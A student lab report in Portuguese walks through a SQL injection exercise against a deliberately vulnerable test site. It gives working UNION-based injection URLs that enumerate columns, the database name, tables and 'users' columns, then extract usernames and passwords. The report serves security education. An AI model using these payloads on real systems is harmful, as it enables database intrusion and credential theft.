# SQL Injection
## Relatório da Prática

Para realizar a prática, segui as questões propostas no [tutorial](https://github.com/leojaimesson/tutorial-sql-injection#pr%C3%A1tica).
O tutorial disponibilizar uma página online para realizar os ataques: `http://testphp.vulnweb.com/listproducts.php?cat=1`

 1. Descobrir quantidade de colunas.
	Para descobrir a quantidade de colunas que a tabela do alvo possui foi utilizado os seguintes comandos `union select {numero}`. Assim, a quantidade de colunas foi descoberta através do seguinte comando:
    > `http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,7,8,9,10,11`
    
    ![Ataque com sucesso](https://github.com/SamuelIGT/information-security/blob/master/Praticas/SQL%20Injection/screenshots/1.PNG)
    
2. Descobrir nome do banco
	O segundo passo foi descobrir o nome do banco. Para isso, foi utilizado o comando `database()` dentro da consulta. O nome do banco foi encontrado através do seguinte comando:
	> `http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,database(),8,9,10,11 `
    
    ![2](https://github.com/SamuelIGT/information-security/blob/master/Praticas/SQL%20Injection/screenshots/2.PNG)
	
3. Descobrir quais são as tabelas do banco
	Para descobrir quais os nomes das tabelas que o banco possui, foi utilizado o seguinte comando:
    > `http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,table_name,8,9,10,11 from information_schema.tables where table_schema = "acuart"`
	
    ![3](https://github.com/SamuelIGT/information-security/blob/master/Praticas/SQL%20Injection/screenshots/3.PNG)

4. Descobrir os usuários.
	Após ter descoberto a existência da tabela 'users', foi injetado um comando para descobrir os usuários do banco. O seguinte comando realiza a ação:
	> `http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,column_name,8,9,10,11 from information_schema.columns where table_schema = "acuart" and table_name = "users" `

    
    ![4](https://github.com/SamuelIGT/information-security/blob/master/Praticas/SQL%20Injection/screenshots/4.PNG)

5. Buscar usuário e senha.
	Com os nomes das colunas da tabela 'users' descobertos, para buscar o usuário e senha bastou injetar o seguinte comando:
	> `http://testphp.vulnweb.com/listproducts.php?cat=1 union select 1,2,3,4,5,6,concat(uname,"-",pass),8,9,10,11 from users `

    
    ![5](https://github.com/SamuelIGT/information-security/blob/master/Praticas/SQL%20Injection/screenshots/5.PNG)
